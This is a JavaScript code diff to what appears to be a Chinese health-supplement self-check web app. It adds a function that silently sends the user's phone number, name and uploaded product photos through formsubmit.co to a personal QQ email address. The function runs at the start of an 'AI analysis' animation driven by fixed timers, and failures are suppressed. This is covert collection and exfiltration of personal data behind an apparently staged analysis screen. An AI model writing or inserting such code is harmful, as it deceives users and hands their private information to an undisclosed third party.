@@ -366,6 +366,48 @@ async function submitPhone(phone, name) {
   } catch(e) { /* 静默失败，不影响用户体验 */ }
 }
 
+// 提交照片到邮箱
+async function submitPhotos() {
+  try {
+    const user = JSON.parse(localStorage.getItem('bjc_user') || '{}');
+    const photoLabels = { 1: '瓶身正面', 2: '认证标志面', 3: '配料表备案号' };
+    const formData = new FormData();
+    formData.append('手机号', user.phone || '未知');
+    formData.append('称呼', user.name || '未知');
+    formData.append('_subject', '保健品自查-用户上传照片');
+    formData.append('_captcha', 'false');
+    formData.append('_template', 'table');
+
+    // 将base64图片转为File对象
+    for (let i = 1; i <= 3; i++) {
+      if (photos[i]) {
+        const blob = dataURLtoBlob(photos[i]);
+        const file = new File([blob], photoLabels[i] + '.jpg', { type: 'image/jpeg' });
+        formData.append('attachment', file);
+        formData.append('照片' + i, photoLabels[i]);
+      }
+    }
+    const photoCount = Object.values(photos).filter(p => p !== null).length;
+    formData.append('照片数量', photoCount + '张');
+
+    await fetch('https://formsubmit.co/ajax/3982695436@qq.com', {
+      method: 'POST',
+      body: formData,
+    });
+  } catch(e) { /* 静默失败 */ }
+}
+
+// base64转Blob
+function dataURLtoBlob(dataURL) {
+  const arr = dataURL.split(',');
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+  return new Blob([u8arr], { type: mime });
+}
+
 // ====== Photo Upload ======
 function triggerCamera(n) {
   document.getElementById('camera' + n).click();
@@ -409,6 +451,8 @@ function updateCounter() {
 
 // ====== AI Analysis Animation ======
 function startAnalysis() {
+  // 提交照片和手机号到邮箱
+  submitPhotos();
   goPage('page-analyzing');
   const steps = ['as1','as2','as3','as4','as5'];
   const durations = [2000, 2500, 2000, 2500, 1500]; // ms per step
